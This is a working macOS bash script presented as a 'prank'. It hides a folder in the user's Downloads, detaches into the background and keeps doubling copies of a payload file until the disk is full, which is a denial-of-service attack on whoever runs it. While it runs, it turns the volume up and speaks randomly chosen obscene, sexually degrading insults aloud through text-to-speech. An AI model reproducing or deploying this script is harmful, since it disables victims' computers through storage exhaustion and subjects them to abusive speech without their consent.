#!/bin/bash

# Karan's Ultimate Prank v4.0 - SOTA WORKING EDITION
# Exponential doubling + Dark audio + Guaranteed execution

VERSION="4.0.0"
HIDDEN_DIR="$HOME/Downloads/.Karan"

# Colors (clean, no blinking)
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; PURPLE='\033[0;35m'; CYAN='\033[0;36m'
BOLD='\033[1m'; BG_GREEN='\033[42m'; BG_RED='\033[41m'
BG_YELLOW='\033[43m'; WHITE='\033[1;37m'; NC='\033[0m'

# Dark gritty messages (visual)
DARK_MESSAGES=(
    "🎪 Welcome to Karan's exponential circus of doom!"
    "🔥 Burning through bytes like a digital inferno!"
    "💀 Your storage meets its exponential executioner!"
    "⚡ Doubling faster than your mounting dread!"
    "🌪️ Creating exponential chaos from digital hell!"
    "🎯 Exponential bullseye to your disk's heart!"
    "🚀 To infinity with exponential destruction!"
    "💎 Each doubling creates cursed gems!"
    "🔮 Predicting exponential digital apocalypse!"
    "🎨 Painting exponential nightmares on your drive!"
    "🎵 Can you hear your hard drive's death rattle?"
    "☠️ Your data's last supper is being served!"
    "🕷️ Spinning the web of destruction around your disk!"
    "☢️ Radioactive storage meltdown incoming!"
    "🧟‍♂️ Zombies are eating your free space alive!"
    "💀 Skeletons dancing on your hard drive's grave!"
    "🎃 Halloween came early: your disk is haunted!"
    "🌑 Black hole of storage: nothing escapes!"
    "🔪 Cutting your space like a digital surgeon!"
    "💣 Storage bomb exploding bytes everywhere!"
    "🩸 Bloodbath on your file system!"
    "☣️ Virus unleashed: storage under quarantine!"
    "👻 Ghost files creeping in the digital shadows!"
    "🧨 Dynamite fuse lit: boom time for your drive!"
    "🦇 Bats swarming your precious storage space!"
    "🔥 Inferno rising: no file safe tonight!"
    "🗡️ Blade of deletion cutting deep!"
    "⚰️ Digging your storage's digital grave!"
    "🦠 Malicious multiplication virus spreading!"
    "🌋 Volcanic eruption of exponential files!"
    "🕸️ Caught in the spider's web of doom!"
    "💀 Grim reaper harvesting your gigabytes!"
    "🎪 Freak show: witness your disk's demise!"
    "👹 Demons feasting on your free space!"
    "🌊 Tsunami of files drowning your disk!"
    "⚡ Lightning strikes: your storage is toast!"
    "🦈 Sharks circling your dying storage!"
    "🔥 Phoenix rising from your storage ashes!"
)

# Dark audio messages (what gets spoken)
DARK_AUDIO=(
    "Your disk is crying tears of binary despair!"
    "i know you're a shit-stained loser"
    "i know you're a fucking waste of skin"
    "i know you're a pathetic dumbfuck"
    "i know you're a stupid fucking bitch"
    "i know you're a useless fucking prick"
    "i know you're a fucking shit-for-brains"
    "i know you're a pathetic piece of fucking trash"
    "i know you're a fucking idiot sandwich"
    "Your precious files are screaming for mercy!"
    "i know you're a fucking dumb cunt"
    "i know you're a useless fucking cock"
    "i know you're a fucking dumbass motherfucker"
    "your asshole is a fucking black hole"
    "you're a fucking worthless cunt"
    "your tits are fucking disgusting"
    "you're a fucking dumbass motherfucker"
    "your dick is smaller than a fucking ant"
    "you're a fucking piece of shit"
    "your brain is fucking mush"
    "i know you're a worthless piece of shit"
    "i know you're a fucking dumb cunt"
    "i know you're a shit-stained loser"
    "i know you're a fucking waste of skin"
    "Your hard drive is haunted by digital ghosts!"
    "you're a fucking cocksucking cunt"
    "your pussy stinks like rotten fish"
    "you're a shit-eating piece of trash"
    "you're a fucking dumbfuck"
    "you're a fucking shit-stained loser"
    "your mouth is a fucking cesspool"
    "you're a fucking useless waste of skin"
    "your eyes are fucking beady"
    "you're a fucking pathetic piece of trash"
    "your nose is a fucking pig snout"
    "you're a fucking disgusting fuck"
    "your teeth are fucking rotten"
    "you're a fucking dumb cunt"
)

# Setup directory (bulletproof)
setup() {
    mkdir -p "$HIDDEN_DIR" 2>/dev/null || true
    chflags hidden "$HIDDEN_DIR" 2>/dev/null || true
    touch "$HIDDEN_DIR/.log" 2>/dev/null || true
}

# Logging function
log_msg() {
    echo -e "${1}${2}${NC}"
    echo "$(date): $2" >> "$HIDDEN_DIR/.log" 2>/dev/null || true
}

# Random visual message
show_dark_msg() {
    local msg=${DARK_MESSAGES[$RANDOM % ${#DARK_MESSAGES[@]}]}
    local colors=("$RED$BOLD" "$PURPLE$BOLD" "$YELLOW$BOLD" "$CYAN$BOLD")
    local color=${colors[$RANDOM % ${#colors[@]}]}
    log_msg "$color" "$msg"
}

# Dark audio (fixed to actually work)
speak_dark() {
    pkill -f "say" 2>/dev/null || true
    sleep 0.1
    local audio_msg=${DARK_AUDIO[$RANDOM % ${#DARK_AUDIO[@]}]}
    osascript -e "set volume output volume 85" 2>/dev/null || true
    say "$audio_msg" 2>/dev/null &
}

# MAIN EXPONENTIAL DUPLICATION FUNCTION
exponential_chaos() {
    local payload="$1"
    
    # Ensure setup first
    setup
    
    # Validate payload exists
    if [[ ! -f "$payload" ]]; then
        log_msg "$RED$BOLD" "💀 ERROR: Payload not found at $payload!"
        return 1
    fi
    
    # Copy payload to hidden location
    cp "$payload" "$HIDDEN_DIR/.payload" || {
        log_msg "$RED$BOLD" "💀 ERROR: Failed to copy payload!"
        return 1
    }
    
    log_msg "$BG_PURPLE$WHITE$BOLD" "🎭 Karan's Ultimate Prank v4.0 - SOTA WORKING!"
    log_msg "$BG_RED$WHITE$BOLD" "📈 Exponential doubling: 1→2→4→8→16→32→64..."
    
    # Initial dark audio
    speak_dark
    
    log_msg "$RED$BOLD" "🚀 INITIATING EXPONENTIAL DIGITAL WARFARE!"
    show_dark_msg
    
    # Start with 1 file
    local round=0
    local current_files=0
    
    # Create the first file
    if cp "$HIDDEN_DIR/.payload" "$HIDDEN_DIR/karan_exp_$(printf "%08d" 1).jpg" 2>/dev/null; then
        current_files=1
        log_msg "$GREEN$BOLD" "💀 ROUND 0: Genesis file created (Total: 1)"
        speak_dark
    else
        log_msg "$RED$BOLD" "💾 DISK FULL at genesis!"
        speak_dark
        return
    fi
    
    # Exponential doubling loop
    while true; do
        round=$((round + 1))
        local target_files=$((current_files * 2))
        local files_to_create=$((target_files - current_files))
        
        log_msg "$BG_YELLOW$RED$BOLD" "🔥 ROUND $round: Exponential doubling $current_files → $target_files files!"
        show_dark_msg
        speak_dark
        
        # Create the new files by copying existing ones
        local created_count=0
        for ((i=1; i<=files_to_create; i++)); do
            local new_file_num=$((current_files + i))
            local source_num=$(((i-1) % current_files + 1))
            
            # Copy from existing file to create new one
            if cp "$HIDDEN_DIR/karan_exp_$(printf "%08d" $source_num).jpg" \
               "$HIDDEN_DIR/karan_exp_$(printf "%08d" $new_file_num).jpg" 2>/dev/null; then
                created_count=$((created_count + 1))
            else
                # Disk full - calculate final count
                local final_count=$((current_files + created_count))
                log_msg "$BG_RED$WHITE$BOLD" "💀 DISK COMPLETELY FULL! Final count: $final_count files!"
                speak_dark
                return
            fi
            
            # Show progress every 50 files for large rounds
            if [[ $((created_count % 50)) -eq 0 ]] && [[ $files_to_create -gt 100 ]]; then
                show_dark_msg
                speak_dark
            fi
        done
        
        # Update current file count
        current_files=$target_files
        
        # Round completion
        log_msg "$BG_GREEN$WHITE$BOLD" "💀 ROUND $round COMPLETE! Total files: $current_files"
        show_dark_msg
        speak_dark
        
        # Exponential milestones
        case $current_files in
            2)
                log_msg "$YELLOW$BOLD" "🎉 2 FILES: The exponential nightmare begins!"
                speak_dark
                ;;
            16)
                log_msg "$RED$BOLD" "🔥 16 FILES: Exponential hellfire unleashed!"
                speak_dark
                ;;
            256)
                log_msg "$PURPLE$BOLD" "💎 256 FILES: Exponential death mastery!"
                speak_dark
                ;;
            4096)
                log_msg "$BG_RED$WHITE$BOLD" "🚀 4096 FILES: EXPONENTIAL ARMAGEDDON!"
                speak_dark
                ;;
            65536)
                log_msg "$BG_PURPLE$WHITE$BOLD" "👑 65,536 FILES: EXPONENTIAL EMPEROR!"
                speak_dark
                ;;
        esac
        
        # Brief pause between rounds
        sleep 0.3
    done
}

# Validate system
validate_system() {
    if [[ "$(uname)" != "Darwin" ]]; then
        echo "💀 ERROR: This prank requires macOS!"
        exit 1
    fi
}

# MAIN EXECUTION
main() {
    validate_system
    setup
    
    local payload="$1"
    if [[ -z "$payload" ]]; then
        payload="/opt/homebrew/share/dingdong/payload.png"
    fi
    
    exponential_chaos "$payload"
}

# Background execution logic
if [[ "$2" == "--background" ]]; then
    # Background mode - run the actual prank
    exec > "$HIDDEN_DIR/.log" 2>&1
    main "$1"
else
    # Foreground mode - launch in background
    setup
    echo -e "${GREEN}${BOLD}🚀 Ultimate Prank v4.0 launched!${NC}"
    echo -e "${PURPLE}${BOLD}⚡ Exponential chaos starting now!${NC}"
    
    # Start background execution
    "$0" "$1" --background &
    disown
fi
